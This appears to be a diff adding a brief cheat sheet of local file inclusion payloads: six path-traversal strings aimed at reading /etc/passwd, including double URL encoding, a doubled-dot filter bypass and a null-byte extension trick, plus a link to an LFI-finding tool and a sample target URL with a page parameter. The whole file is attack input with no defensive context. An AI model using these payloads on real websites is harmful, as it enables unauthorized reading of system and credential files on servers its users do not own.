@@ -1,0 +1,10 @@
+1)../../../etc/passwd
+2)/etc/passwd
+3)....//....//....//etc/passwd
+4)..%252f..%252f..%252fetc/passwd
+5)/var/www/images/../../../etc/passwd
+6)../../../etc/passwd%00.png
+
+https://github.com/capture0x/LFI-FINDER
+
+https://mylocal.life/index.php?page=contact.php
